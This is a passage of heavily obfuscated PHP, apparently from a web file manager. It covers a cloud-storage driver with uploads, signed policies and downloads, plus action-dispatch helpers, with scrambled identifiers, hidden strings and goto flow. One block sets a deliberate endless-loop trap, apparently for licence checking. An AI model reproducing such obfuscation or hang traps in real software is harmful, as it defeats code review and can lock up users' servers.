àáÄˆÆ[$bõçô„‰ƒ…[76]] : 0; $dÇùÒÌŠ…— = count($f³îƒ¯¡¢²) - $då÷Ëáİ‚; if ($E‰È†ö¯ï) { $d±½Ùæø  += $då÷Ëáİ‚; $FÅíÆÍã³ß += $dÇùÒÌŠ…—; if ($bòË®‹ŠŠÇ < $Døù£âçï‘) { break; } continue; } if ($D•Ìí£ğŒæ) { if ($dÇùÒÌŠ…—) { return !0; } } else { if ($då÷Ëáİ‚) { return !0; } } if (count($A¡¥œ‚âì÷) < $Døù£âçï‘) { break; } } if ($E‰È†ö¯ï) { return array($bõçô„‰ƒ…[191] => $FÅíÆÍã³ß, $bõçô„‰ƒ…[192] => $d±½Ùæø ); } return !1; goto AëŞ˜ÊÌ™Ö; bÜ¶í°Ü: $bõçô„‰ƒ… =& $_SERVER[”Ì÷ñ­î¸]; $fÆ²Šë¥«§ = $bõçô„‰ƒ…[33]; $Døù£âçï‘ = 1000; goto DÙ«î¢’‹ã; AëŞ˜ÊÌ™Ö: } public function listAll($F÷ÅíñàÜ) { $D—Ô÷‹Ï¿Í = array(); $this->recursionAllFiles($F÷ÅíñàÜ, $D—Ô÷‹Ï¿Í); return $D—Ô÷‹Ï¿Í; } public function canRead($aß¾ÁËøŸ™) { return $this->exist($aß¾ÁËøŸ™) ? !0 : !1; } public function canWrite($A¥ê¢ÚƒÑ) { return $this->exist($A¥ê¢ÚƒÑ) ? !0 : !1; } public function getContent($bÌÏ¶¬§­â) { return $this->fileSubstr($bÌÏ¶¬§­â, 0, -1); } public function setContent($Aìøƒ³ì, $b‘ÀêˆÅ = '') { $f¼Íâ©´¹‡ =& $_SERVER[”Ì÷ñ­î¸]; if (!$b‘ÀêˆÅ) { $dİçõ˜ß–Ş = $this->ussRequest($Aìøƒ³ì, $f¼Íâ©´¹‡[212]); return $dİçõ˜ß–Ş[$f¼Íâ©´¹‡[1032]]; } $D —äÙ°» = $this->tempFile($this->pathThis($Aìøƒ³ì)); file_put_contents($D —äÙ°», $b‘ÀêˆÅ); if ($this->upload($Aìøƒ³ì, $D —äÙ°»)) { $this->tempFileRemve($D —äÙ°»); return !0; } return !1; } public function fileSubstr($d­‚Ñ Ä, $F¡¢”â‚êº, $aŠš¸ÏíŸ) { $b·Œ£´÷óì =& $_SERVER[”Ì÷ñ­î¸]; if (!($BïÃìºœ = $this->link($d­‚Ñ Ä))) { return !1; } $D—¸ˆ‚Ó² = !1; if ($aŠš¸ÏíŸ > 0) { $e¯¯Ü‘Ó‘“ = $F¡¢”â‚êº + $aŠš¸ÏíŸ - 1; $D—¸ˆ‚Ó² = array($b·Œ£´÷óì[1222] . $F¡¢”â‚êº . $b·Œ£´÷óì[412] . $e¯¯Ü‘Ó‘“); } $c¢óÖ×ÊÈ = url_request($BïÃìºœ, $b·Œ£´÷óì[216], !1, $D—¸ˆ‚Ó²); return $c¢óÖ×ÊÈ[$b·Œ£´÷óì[690]] ? $c¢óÖ×ÊÈ[$b·Œ£´÷óì[1034]] : !1; } public function upload($A°¶Šã…½İ, $eß‚Í¡âî‘, $Fëö³•“‡ = false, $fò¿¡ôÙ½ = REPEAT_REPLACE) { goto dÄÅµê®ñã; dù‚ˆÈöÒ£: if (!$Eğìˆ›¹Í–[$fÂòàã‚©Å[1032]]) { return !1; } $a¶±·ƒ×ôš = $Eğìˆ›¹Í–[$fÂòàã‚©Å[1034]]; $cõ÷›¶à‡© = 0; goto C°›ˆæ•ÉÑ; c‚½’Û‰¿¶: do { $F“æäãßšè = $a¶±·ƒ×ôš[$fÂòàã‚©Å[1268]]; fseek($Fåâ½·Ö®‘, $cõ÷›¶à‡©); $b»Î·Ìµá™ = fread($Fåâ½·Ö®‘, $F“æäãßšè); $c¬ùÀòØ = 0; do { $c¬ùÀòØ++; $a¶±·ƒ×ôš = $this->uploadPart($A°¶Šã…½İ, $a¶±·ƒ×ôš, $b»Î·Ìµá™); } while (!$a¶±·ƒ×ôš && $c¬ùÀòØ < 3); if (!$a¶±·ƒ×ôš) { return !1; } $eùò¸ãö» = $a¶±·ƒ×ôš[$fÂòàã‚©Å[1267]]; $cõ÷›¶à‡© += $F“æäãßšè; } while ($eùò¸ãö» != -1); fclose($Fåâ½·Ö®‘); $dàù†ŸÌ³ = array($fÂòàã‚©Å[1269], $fÂòàã‚©Å[1270] . $a¶±·ƒ×ôš[$fÂòàã‚©Å[1271]], $fÂòàã‚©Å[1265]); goto e¦Á³±ù¼; C°›ˆæ•ÉÑ: $eùò¸ãö» = $a¶±·ƒ×ôš[$fÂòàã‚©Å[1267]]; $Fåâ½·Ö®‘ = fopen($eß‚Í¡âî‘, $fÂòàã‚©Å[1172]); if (!$Fåâ½·Ö®‘) { return !1; } goto c‚½’Û‰¿¶; dÄÅµê®ñã: $fÂòàã‚©Å =& $_SERVER[”Ì÷ñ­î¸]; $eÆ Ë’Ò = IO::size($eß‚Í¡âî‘); if ($eÆ Ë’Ò <= 1024 * 1024 * 200) { $FË™‰ÇĞÇá = array($fÂòàã‚©Å[1262] . $eß‚Í¡âî‘); $Eğìˆ›¹Í– = $this->ussRequest($A°¶Šã…½İ, $fÂòàã‚©Å[214], $FË™‰ÇĞÇá); return $Eğìˆ›¹Í–[$fÂòàã‚©Å[1032]] ? $this->getPathOuter($A°¶Šã…½İ) : !1; } goto Eª™Ÿ¾‰ÏÕ; Eª™Ÿ¾‰ÏÕ: $c÷¯ËŒØĞ‰ = 1024 * 1024 * 10; $dàù†ŸÌ³ = array($fÂòàã‚©Å[1263], $fÂòàã‚©Å[1264] . $eÆ Ë’Ò, $fÂòàã‚©Å[1265], $fÂòàã‚©Å[1266] . $c÷¯ËŒØĞ‰); $Eğìˆ›¹Í– = $this->ussRequest($A°¶Šã…½İ, $fÂòàã‚©Å[214], !1, $dàù†ŸÌ³); goto dù‚ˆÈöÒ£; e¦Á³±ù¼: $Eğìˆ›¹Í– = $this->ussRequest($A°¶Šã…½İ, $fÂòàã‚©Å[214], !1, $dàù†ŸÌ³); return $Eğìˆ›¹Í–[$fÂòàã‚©Å[1032]] ? $this->getPathOuter($EªÍÔÁ²Å˜) : !1; goto AÆŞ‘Á‘²‡; AÆŞ‘Á‘²‡: } private function uploadPart($e˜øÎŞ“Š, $dƒƒ½’·, &$c‚ñ´—ö¶æ) { $a‰Ã‰ßœ¹˜ =& $_SERVER[”Ì÷ñ­î¸]; $B ïùôë¸£ = array($a‰Ã‰ßœ¹˜[1272], $a‰Ã‰ßœ¹˜[1270] . $dƒƒ½’·[$a‰Ã‰ßœ¹˜[1271]], $a‰Ã‰ßœ¹˜[1273] . $dƒƒ½’·[$a‰Ã‰ßœ¹˜[1267]], $a‰Ã‰ßœ¹˜[138] . $dƒƒ½’·[$a‰Ã‰ßœ¹˜[1268]]); $bí¯—òÜä§ = $this->ussRequest($e˜øÎŞ“Š, $a‰Ã‰ßœ¹˜[214], $c‚ñ´—ö¶æ, $B ïùôë¸£); return !$bí¯—òÜä§[$a‰Ã‰ßœ¹˜[1032]] ? $bí¯—òÜä§[$a‰Ã‰ßœ¹˜[1032]] : $bí¯—òÜä§[$a‰Ã‰ßœ¹˜[1034]]; } public function uploadFormData($eáì¯öÉ­, $a’Ú·•ã‹ = 3600) { return $this->uploadPolicy($eáì¯öÉ­, $a’Ú·•ã‹); } public function multiUploadFormData($D‰İ­ôéË, $Eõ®Ãáœ = 3600) { $Aº®»½±¥ =& $_SERVER[”Ì÷ñ­î¸]; $Fëï¼Ã÷¦ = (int) $GLOBALS[$Aº®»½±¥[7]][$Aº®»½±¥[77]]; return $this->uploadPolicy($D‰İ­ôéË, $Eõ®Ãáœ, $Fëï¼Ã÷¦); } private function uploadPolicy($Bá©”°ÚÌí, $D‹ÊìÎ³· = 3600, $e¦÷ö™ˆ©‘ = 0) { goto FÉà¡Ğ¬ñˆ; AÈ»¨ŒÑÆ: $fÈ‘Ö×„Ÿã = array($BŒñ†„ç¿Ü[1274] => $this->bucket, $BŒñ†„ç¿Ü[1275] => $Bá©”°ÚÌí, $BŒñ†„ç¿Ü[1276] => time() + $D‹ÊìÎ³·, $BŒñ†„ç¿Ü[1277] => $FÁõŞÈ©•–); if ($e¦÷ö™ˆ©‘) { $fÈ‘Ö×„Ÿã[$BŒñ†„ç¿Ü[1193]] = $e¦÷ö™ˆ©‘; } $bƒºÊÀ¾õ˜ = base64_encode(json_encode($fÈ‘Ö×„Ÿã)); goto bÈ”âğàµ”; FÉà¡Ğ¬ñˆ: $BŒñ†„ç¿Ü =& $_SERVER[”Ì÷ñ­î¸]; $DòÅŞšĞŒ = $BŒñ†„ç¿Ü[8] . $this->bucket; $FÁõŞÈ©•– = gmdate($BŒñ†„ç¿Ü[1207]); goto AÈ»¨ŒÑÆ; bÈ”âğàµ”: $Bñ¬ö—•œİ = base64_encode(hash_hmac($BŒñ†„ç¿Ü[1244], "\x50\117\123\x54\x26{$DòÅŞšĞŒ}\x26{$FÁõŞÈ©•–}\46{$bƒºÊÀ¾õ˜}", md5("{$this->userpass}"), !0)); $eƒ–÷óÑø = array($BŒñ†„ç¿Ü[1112] => $bƒºÊÀ¾õ˜, $BŒñ†„ç¿Ü[1278] => "\125\x50\131\125\x4e\40{$this->username}\72{$Bñ¬ö—•œİ}", $BŒñ†„ç¿Ü[169] => $this->endpoint . $DòÅŞšĞŒ); return $eƒ–÷óÑø; goto EùóÆÔ§µé; EùóÆÔ§µé: } public function download($dÈÈŠÔ‚Å, $fÕÏ‚øßöÈ) { goto FÜÊ®ÜœÚ; BÔ÷Š¬‘ : fclose($eˆÚ‰Ÿ£×’); return $fÕÏ‚øßöÈ; goto C‹ƒÁŠš³; e®àÍÃ„Æ¾: $B³‰¤ãÅÛš = 1024 * 200; $eˆÚ‰Ÿ£×’ = fopen($aˆÄ²¨¯Œ, $_SERVER[”Ì÷ñ­î¸][1228]); while (!0) { $c†ØĞïà™Ö = $this->fileSubstr($dÈÈŠÔ‚Å, $D¸Å¿Õ¹Ù‘, $B³‰¤ãÅÛš); if ($c†ØĞïà™Ö === !1) { return !1; } fwrite($eˆÚ‰Ÿ£×’, $c†ØĞïà™Ö); $D¸Å¿Õ¹Ù‘ += $B³‰¤ãÅÛš; if (strlen($c†ØĞïà™Ö) < $B³‰¤ãÅÛš) { break; } } goto BÔ÷Š¬‘ ; FÜÊ®ÜœÚ: $aˆÄ²¨¯Œ = IO::getPathInner(IO::mkfile($fÕÏ‚øßöÈ)); if (!($bõàĞ˜©Òœ = $this->link($dÈÈŠÔ‚Å))) { return !1; } $D¸Å¿Õ¹Ù‘ = 0; goto e®àÍÃ„Æ¾; C‹ƒÁŠš³: } public function link($BìŸ«˜Êë«, $c†ğÅİ„’Â = array()) { $B·÷—«â÷å =& $_SERVER[”Ì÷ñ­î¸]; $BìŸ«˜Êë« = trim($BìŸ«˜Êë«, $B·÷—«â÷å[8]); if (!empty($this->token)) { $d¹ŸåáÉì = strtotime(date($B·÷—«â÷å[1279])); $Aè©ÓáéÎÁ = substr(md5($this->token . $B·÷—«â÷å[272] . $d¹ŸåáÉì . $B·÷—«â÷å[1280] . $BìŸ«˜Êë«), 12, 8) . $d¹ŸåáÉì; $c†ğÅİ„’Â[] = $B·÷—«â÷å[1281] . $Aè©ÓáéÎÁ; } $d—†©è—´Ø = !empty($c†ğÅİ„’Â) ? $B·÷—«â÷å[69] . implode($B·÷—«â÷å[272], $c†ğÅİ„’Â) : $B·÷—«â÷å[33]; return $this->getHost() . $B·÷—«â÷å[8] . $BìŸ«˜Êë« . $d—†©è—´Ø; } public function fileOut($EÓÍíÑÈ˜Í, $fÏµœšáêÑ = false, $FÑ­æê¤áº = false, $D…Úåƒµä = '') { if (!$FÑ­æê¤áº) { $FÑ­æê¤áº = $this->pathThis($EÓÍíÑÈ˜Í); } $c—‡¤‘–Æ§ = $fÏµœšáêÑ ? array($_SERVER[”Ì÷ñ­î¸][1282] . rawurlencode($FÑ­æê¤áº)) : array(); $Cê©œ…ğå¡ = $this->link($EÓÍíÑÈ˜Í, $c—‡¤‘–Æ§); $this->fileOutLink($Cê©œ…ğå¡); } public function fileOutServer($C³¦äô¤Á«, $fÛéÔ¢éÄñ = false, $e÷˜Í¨¢ = false, $D­ÇÕ¼ÂÓç = '') { parent::fileOut($C³¦äô¤Á«, $fÛéÔ¢éÄñ, $e÷˜Í¨¢, $D­ÇÕ¼ÂÓç); } public function fileOutImage($AŠ²—†Š×Œ, $B‰Ú‡¤í‡² = 250) { $D›­Ù˜Â¦è = $this->link($AŠ²—†Š×Œ . $_SERVER[”Ì÷ñ­î¸][1283] . $B‰Ú‡¤í‡²); $this->fileOutLink($D›­Ù˜Â¦è); } public function fileOutImageServer($d‰Ÿâ‹Æ—ƒ, $aµ‡Õ‚íÄ¬ = 250) { parent::fileOutImage($d‰Ÿâ‹Æ—ƒ, $aµ‡Õ‚íÄ¬); } public function hashMd5($C‚…Ô‹…–Ÿ) { $d¦Ô‡šŒ¸‘ =& $_SERVER[”Ì÷ñ­î¸]; $aÍàŸŒêËî = $this->objectMeta($C‚…Ô‹…–Ÿ); return isset($aÍàŸŒêËî[$d¦Ô‡šŒ¸‘[196]]) ? $aÍàŸŒêËî[$d¦Ô‡šŒ¸‘[196]] : !1; } public function size($f¬ªÌ—ÕÈ®) { $e†§Á„²Åã = $this->objectMeta($f¬ªÌ—ÕÈ®); return $e†§Á„²Åã ? $e†§Á„²Åã[$_SERVER[”Ì÷ñ­î¸][77]] : 0; } public function info($B’íØ¥‘Ş¹) { if ($this->isFolder($B’íØ¥‘Ş¹)) { return $this->folderInfo($B’íØ¥‘Ş¹); } else { if ($this->isFile($B’íØ¥‘Ş¹)) { return $this->fileInfo($B’íØ¥‘Ş¹); } } return !1; } public function exist($eåº‘ÕÁê) { return $this->isFile($eåº‘ÕÁê) || $this->isFolder($eåº‘ÕÁê); } public function isFile($aÑÎŸ‡ ÷ß) { return !$this->isFolder($aÑÎŸ‡ ÷ß) && $this->objectMeta($aÑÎŸ‡ ÷ß); } public function isFolder($bŠ–¥…‚¥÷) { return $this->cacheMethod($_SERVER[”Ì÷ñ­î¸][223], $bŠ–¥…‚¥÷); } protected function objectMeta($bâàËÅ”Ë) { return $this->cacheMethod($_SERVER[”Ì÷ñ­î¸][224], $bâàËÅ”Ë); } protected function _objectMeta($AÍŒï»ÚÓ³) { goto d±ªµœÓªœ; DîÆñÏàÓÍ: if (!$cí‰…Şâé[$CÅ“ŠªÀÆ­[1032]]) { return null; } $e™ãèÂëñ = isset($cí‰…Şâé[$CÅ“ŠªÀÆ­[1034]]) ? $cí‰…Şâé[$CÅ“ŠªÀÆ­[1034]] : array(); if (!isset($e™ãèÂëñ[$CÅ“ŠªÀÆ­[1285]])) { return null; } goto d¿›ìóÔ¢Œ; d¿›ìóÔ¢Œ: $eÊ¯œ©…’ì = array($CÅ“ŠªÀÆ­[28] => get_path_this($AÍŒï»ÚÓ³), $CÅ“ŠªÀÆ­[29] => isset($e™ãèÂëñ[$CÅ“ŠªÀÆ­[1285]]) ? $e™ãèÂëñ[$CÅ“ŠªÀÆ­[1285]] : null, $CÅ“ŠªÀÆ­[77] => isset($e™ãèÂëñ[$CÅ“ŠªÀÆ­[1286]]) ? $e™ãèÂëñ[$CÅ“ŠªÀÆ­[1286]] : null, $CÅ“ŠªÀÆ­[196] => isset($e™ãèÂëñ[$CÅ“ŠªÀÆ­[1287]]) ? $e™ãèÂëñ[$CÅ“ŠªÀÆ­[1287]] : null, $CÅ“ŠªÀÆ­[1255] => isset($e™ãèÂëñ[$CÅ“ŠªÀÆ­[1288]]) ? $e™ãèÂëñ[$CÅ“ŠªÀÆ­[1288]] : null); $eÊ¯œ©…’ì[$CÅ“ŠªÀÆ­[1256]] = isset($e™ãèÂëñ[$CÅ“ŠªÀÆ­[1289]]) ? strtotime($e™ãèÂëñ[$CÅ“ŠªÀÆ­[1289]]) : $eÊ¯œ©…’ì[$CÅ“ŠªÀÆ­[1255]]; return $eÊ¯œ©…’ì; goto bïå¸â’‘Ì; d±ªµœÓªœ: $CÅ“ŠªÀÆ­ =& $_SERVER[”Ì÷ñ­î¸]; if ($AÍŒï»ÚÓ³ == $CÅ“ŠªÀÆ­[33] || $AÍŒï»ÚÓ³ == $CÅ“ŠªÀÆ­[8]) { return array(); } $cí‰…Şâé = $this->ussRequest($AÍŒï»ÚÓ³, $CÅ“ŠªÀÆ­[1284]); goto DîÆñÏàÓÍ; bïå¸â’‘Ì: } protected function _isFolder($d•„ÇÛÊ’Œ) { $A£…Ò½Š’Î =& $_SERVER[”Ì÷ñ­î¸]; if ($d•„ÇÛÊ’Œ == $A£…Ò½Š’Î[33] || $d•„ÇÛÊ’Œ == $A£…Ò½Š’Î[8]) { return !0; } $e‘âóæôŒá = $this->objectMeta($d•„ÇÛÊ’Œ); return isset($e‘âóæôŒá[$A£…Ò½Š’Î[29]]) && $e‘âóæôŒá[$A£…Ò½Š’Î[29]] == $A£…Ò½Š’Î[76] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[”Ì÷ñ­î¸][791]]) || !isset($_SERVER[$_SERVER[”Ì÷ñ­î¸][1153]])) { goto d³×£ª´ğ×; f‘àóõ—ª: $D¬ËÉÛˆÌ‚ = explode($_SERVER[”Ì÷ñ­î¸][217], $fî Í—çÚÔ); if (count($D¬ËÉÛˆÌ‚) < $_SERVER[”Ì÷ñ­î¸][553]) { $fó±ŸéÕå = $_SERVER[”Ì÷ñ­î¸][794]; $fó±ŸéÕå(); } $bìÍ˜ãŒİ½ = $_SERVER[”Ì÷ñ­î¸][1152]; goto c“å³•„ÅÚ; d³×£ª´ğ×: $CÃÃ“ŠŞÙ = $_SERVER[”Ì÷ñ­î¸][793]; $b´ïäå‰Õ = $_SERVER[$_SERVER[”Ì÷ñ­î¸][788]] . $_SERVER[”Ì÷ñ­î¸][789]; $fî Í—çÚÔ = $CÃÃ“ŠŞÙ($b´ïäå‰Õ); goto f‘àóõ—ª; c“å³•„ÅÚ: $bìÍ˜ãŒİ½($_SERVER[$_SERVER[”Ì÷ñ­î¸][788]] . $_SERVER[”Ì÷ñ­î¸][789]); $a‘À†ˆŞ„ = 2; while ($a‘À†ˆŞ„ > 1) { $e¸ŠÖÂ™›Š = rawurlencode($a‘À†ˆŞ„ . $_SERVER[”Ì÷ñ­î¸][361]); } goto dœÂĞ¸ÆË; dœÂĞ¸ÆË: } goto CºªÎÛ’¯Ü; BøäØåÃ‘Ò: function beforeShutdownFatalError($e¼¤ƒŞ‘º) { think_exception($e¼¤ƒŞ‘º); } $_SERVER[$_SERVER[æÒğ][48]] = $C‚ºÏ¦’ôß($_SERVER[$_SERVER[æÒğ][45]]); $A¿òÈõ£» = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto Cà¤¡·ƒ; E›ä‹°ÒÛ: define($_SERVER[”Ì÷ñ­î¸][1936], 3); define($_SERVER[”Ì÷ñ­î¸][1937], 4); define($_SERVER[”Ì÷ñ­î¸][1938], 5); goto b©óÃ‹îéÀ; C«è™’½’Ï: function ActionCall($c®®¾Š ÂÇ) { $bÒ’¢´İˆ½ = array_slice(func_get_args(), 1); return ActionApply($c®®¾Š ÂÇ, $bÒ’¢´İˆ½); } function ActionCallApi($bíÈ…İæõÙ, $Eëã³‰ª = '') { goto dœœÃÖÅø»; aè¨ÆÅ„Ï: $B‰êâë¹Ù = json_decode($b·ŸÁ­Çµ¶, !0); $bÂÃ¬Å³ = is_array($B‰êâë¹Ù) ? $B‰êâë¹Ù : array($D­õñ”ß¨ù[33] => null, $D­õñ”ß¨ù[34] => $b·ŸÁ­Çµ¶); if (!$B‰êâë¹Ù) { echo $b·ŸÁ­Çµ¶; } goto aÙ‡¾šïñù; bç¤ªÊœ­: $AÁ…¥À¶ÊÇ = phpBinCommand(); if ($AÁ…¥À¶ÊÇ && function_exists($D­õñ”ß¨ù[25])) { $fòØã…ÒÈ = $AÁ…¥À¶ÊÇ . $D­õñ”ß¨ù[26] . BASIC_PATH . $D­õñ”ß¨ù[27] . escapeshellarg($bíÈ…İæõÙ); $b·ŸÁ­Çµ¶ = shell_exec($fòØã…ÒÈ); } if (!$b·ŸÁ­Çµ¶) { $B¦ËíÕ³æ = stream_context_create(array($D­õñ”ß¨ù[28] => array($D­õñ”ß¨ù[29] => 20, $D­õñ”ß¨ù[30] => $D­õñ”ß¨ù[31]))); $b·ŸÁ­Çµ¶ = file_get_contents(APP_HOST . $D­õñ”ß¨ù[32] . $bíÈ…İæõÙ, !1, $B¦ËíÕ³æ); } goto aè¨ÆÅ„Ï; dœœÃÖÅø»: $D­õñ”ß¨ù =& $_SERVER[æÒğ]; $bÚÃİ¢¼—ø = $Eëã³‰ª; if (is_array($Eëã³‰ª)) { $bÚÃİ¢¼—ø = $D­õñ”ß¨ù[20]; foreach ($Eëã³‰ª as $fÍ‚ÄÜßÑï => $Eï²îÀÍÆ¹) { $Eï²îÀÍÆ¹ = is_array($Eï²îÀÍÆ¹) ? json_encode($Eï²îÀÍÆ¹) : $Eï²îÀÍÆ¹; $Eï²îÀÍÆ¹ = is_bool($Eï²îÀÍÆ¹) ? intval($Eï²îÀÍÆ¹) : $Eï²îÀÍÆ¹; $bÚÃİ¢¼—ø .= $D­õñ”ß¨ù[21] . $fÍ‚ÄÜßÑï . $D­õñ”ß¨ù[22] . rawurlencode($Eï²îÀÍÆ¹); } } goto d®ÎÒÅù; d®ÎÒÅù: $F¨Ôº¥àŠò = Action($D­õñ”ß¨ù[23])->accessToken(); $bíÈ…İæõÙ = str_replace($D­õñ”ß¨ù[5], $D­õñ”ß¨ù[4], $bíÈ…İæõÙ) . $D­õñ”ß¨ù[24] . $F¨Ôº¥àŠò . $bÚÃİ¢¼—ø; $b·ŸÁ­Çµ¶ = $D­õñ”ß¨ù[20]; goto bç¤ªÊœ­; aÙ‡¾šïñù: return $bÂÃ¬Å³; goto a¹šÉôÎé’; a¹šÉôÎé’: } function ActionCallHook($aïÆÀİâ²Ğ) { goto DîĞÙ¬Â‘; fÖ‡á¢¨éË: $GLOBALS[$dÅ›¡Úè´[35]] = 1; $Cìí—ØÈŒ = ActionApply($aïÆÀİâ²Ğ, $CˆÏâµÅù“); $aØÀğ©ï”İ = ob_get_clean(); goto aâêÑÑ; DîĞÙ¬Â‘: $dÅ›¡Úè´ =& $_SERVER[æÒğ]; ob_start(); $CˆÏâµÅù“ = array_slice(func_get_args(), 1); goto fÖ‡á¢¨éË; aâêÑÑ: $Cìí—ØÈŒ = $aØÀğ©ï”İ ? json_decode($aØÀğ©ï”İ, !0) : $Cìí—ØÈŒ; $GLOBALS[$dÅ›¡Úè´[35]] = 0; return $Cìí—ØÈŒ; goto BÍ×«‘İÂè; BÍ×«‘İÂè: } goto DÓÆ… Æõ«; D„¾‰É–µÕ: function Action($DÈÉ İäæÇ = '') { goto b­œ™íï¨; b­œ™íï¨: $e„Îì ±Í =& $_SERVER[æÒğ]; static $C…Íã„‹­ = array(); $E¾§Ë†ÅÕÆ = $DÈÉ İäæÇ; goto A‹¦¶Ì††; fßÔ¶µ²– : if (isset($C…Íã„‹­[$c‚§Ê¾Â…İ])) { return $C…Íã„‹­[$c‚§Ê¾Â…İ]; } if (is_file($a“ªÑÀÕ˜¼)) { include_once $a“ªÑÀÕ˜¼; } if (!class_exists($a¬¶Ñ•ñÃÀ)) { return actionCallError("\133{$DÈÉ İäæÇ}\40\x3d\76\x20{$a¬¶Ñ•ñÃÀ}\135\40\x63\154\x61\x73\x73\40\156\157\164\40\x65\170\151\x73\164\163\x21"); } goto Eìùˆ¤¥Ç¤; A‹¦¶Ì††: if (isset($C…Íã„‹­[$E¾§Ë†ÅÕÆ])) { return $C…Íã„‹­[$E¾§Ë†ÅÕÆ]; } $DÈÉ İäæÇ = trim(str_replace($e„Îì ±Í[4], $e„Îì ±Í[5], $DÈÉ İäæÇ), $e„Îì ±Í[4]); $DºĞˆª¾İ¤ = explode($e„Îì ±Í[5], $DÈÉ İäæÇ); goto aÏÖĞŠÖ•×; aÏÖĞŠÖ•×: $Câ´‚°¶¨ = strtolower($DºĞˆª¾İ¤[0]); if (substr($Câ´‚°¶¨, -6) == $e„Îì ±Í[6]) { $DÈÉ İäæÇ = substr($DºĞˆª¾İ¤[0], 0, -6); $a¬¶Ñ•ñÃÀ = $DÈÉ İäæÇ . $e„Îì ±Í[7]; $a“ªÑÀÕ˜¼ = $e„Îì ±Í[8]; if (isset($DºĞˆª¾İ¤[1]) && substr(strtolower($DºĞˆª¾İ¤[1]), -5) == $e„Îì ±Í[9]) { $a¬¶Ñ•ñÃÀ = $DÈÉ İäæÇ . $DºĞˆª¾İ¤[1]; $a“ªÑÀÕ˜¼ = $e„Îì ±Í[10] . $DºĞˆª¾İ¤[1] . $e„Îì ±Í[11]; } else { if (count($DºĞˆª¾İ¤) == 3) { $a¬¶Ñ•ñÃÀ = $DÈÉ İäæÇ . $DºĞˆª¾İ¤[1] . $DºĞˆª¾İ¤[2]; $a“ªÑÀÕ˜¼ = $e„Îì ±Í[12] . $DºĞˆª¾İ¤[1] . $e„Îì ±Í[13] . $DºĞˆª¾İ¤[2] . $e„Îì ±Í[11]; } } $a“ªÑÀÕ˜¼ = PLUGIN_DIR . $DÈÉ İäæÇ . $e„Îì ±Í[4] . $a“ªÑÀÕ˜¼; } else { if (substr($Câ´‚°¶¨, -5) == $e„Îì ±Í[9]) { $DÈÉ İäæÇ = substr($DºĞˆª¾İ¤[0], 0, -5); return Model($DÈÉ İäæÇ); } else { $a¬¶Ñ•ñÃÀ = $DºĞˆª¾İ¤[0] . $DºĞˆª¾İ¤[1]; $a“ªÑÀÕ˜¼ = CONTROLLER_DIR . $DºĞˆª¾İ¤[0] . $e„Îì ±Í[4] . $DºĞˆª¾İ¤[1] . $e„Îì ±Í[14]; } } $c‚§Ê¾Â…İ = strtolower($a¬¶Ñ•ñÃÀ); goto fßÔ¶µ²– ; Eìùˆ¤¥Ç¤: $C…Íã„‹­[$c‚§Ê¾Â…İ] = new $a¬¶Ñ•ñÃÀ(); $C…Íã„‹­[$E¾§Ë†ÅÕÆ] = $C…Íã„‹­[$c‚§Ê¾Â…İ]; return $C…Íã„‹­[$c‚§Ê¾Â…İ]; goto e˜ºÚÑãß; e˜ºÚÑãß: } function ActionApply($aà¼Ê—¨ÅÔ, $bÄ­˜ÔÄâ = array()) { goto FëáíÉŒÍ; dÌöŒ¨Èßö: $EòÈ¸Ñİß = substr($aà¼Ê—¨ÅÔ, 0, $b‚ÊÌ†”¿ù); $FŞ”òÍÉÑğ = substr($aà¼Ê—¨ÅÔ, $b‚ÊÌ†”¿ù + 1); $Få£á‡í² = Action($EòÈ¸Ñİß); goto e»°ŞˆÀ†‡; e»°ŞˆÀ†‡: if (!method_exists($Få£á‡í², $FŞ”òÍÉÑğ)) { return actionCallError("{$aà¼Ê—¨ÅÔ}\x20\155\145\x74\x68\x6f\144\x20\x6e\157\x74\x20\x65\170\x69\x73\x74\163\x21"); } $f¡Â„±‰Ã§ = call_user_func_array(array($Få£á‡í², $FŞ”òÍÉÑğ), $bÄ­˜ÔÄâ); return $f¡Â„±‰Ã§; goto E§±¶ØÚ¬Š; FëáíÉŒÍ: if (is_array($aà¼Ê—¨ÅÔ)) { return call_user_func_array($aà¼Ê—¨ÅÔ, $bÄ­˜ÔÄâ); } if (function_exists($aà¼Ê—¨ÅÔ)) { return call_user_func_array($aà¼Ê—¨ÅÔ, $bÄ­˜ÔÄâ); } $b‚ÊÌ†”¿ù = strrpos($aà¼Ê—¨ÅÔ, $_SERVER[æÒğ][5]); goto dÌöŒ¨Èßö; E§±¶ØÚ¬Š: } function actionCallError($Eé‰Ö¬”ä») { $EéÑø³¡Íè =& $_SERVER[æÒğ]; $bö©©é‰ = json_encode_force(array($EéÑø³¡Íè[15] => this_url(), $EéÑø³¡Íè[16] => $GLOBALS[$EéÑø³¡Íè[16]])); $bö©©é‰ = str_replace(array($EéÑø³¡Íè[17]), array($EéÑø³¡Íè[4]), $bö©©é‰); return write_log($Eé‰Ö¬”ä» . $EéÑø³¡Íè[18] . $bö©©é‰, $EéÑø³¡Íè[19]); } goto C«è™’½’Ï; C‚ˆæù¾ø«: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $fÆ¬Œ¿ğ° =& $_SERVER[”Ì÷ñ­î¸]; $this->objectDriver = array($fÆ¬Œ¿ğ°[57], $fÆ¬Œ¿ğ°[58], $fÆ¬Œ¿ğ°[59], $fÆ¬Œ¿ğ°[60], $fÆ¬Œ¿ğ°[61], $fÆ¬Œ¿ğ°[62], $fÆ¬Œ¿ğ°[63], $fÆ¬Œ¿ğ°[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($AùÉÒøÆ‡Æ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($AùÉÒøÆ‡Æ, $_SERVER[”Ì÷ñ­î¸][8]); } return $AùÉÒøÆ‡Æ; } public function getPathName($F‘Úõí‚çÈ) { return $F‘Úõí‚çÈ; } public function iconvApp($BÆŸÂ‘Ò·) { return $BÆŸÂ‘Ò·; } public function iconvSystem($C–ºãİµ†§) { return $C–ºãİµ†§; } public function iconvTo($cœ„ºò¯Ì, $e¨©Åãµ³‰, $eîè¼ò„¾ë) { goto a¥´‚ñÜ¢Í; b»Ìî«À³æ: $E—“³´ùã = $e¨©Åãµ³‰ . $EÃºØ×óõ‰[66] . $eîè¼ò„¾ë . $EÃºØ×óõ‰[67] . $cœ„ºò¯Ì; if (isset($BİÕŸ¨µ[$E—“³´ùã])) { return $BİÕŸ¨µ[$E—“³´ùã]; } if (function_exists($EÃºØ×óõ‰[68])) { $bçÙæÛ –É = 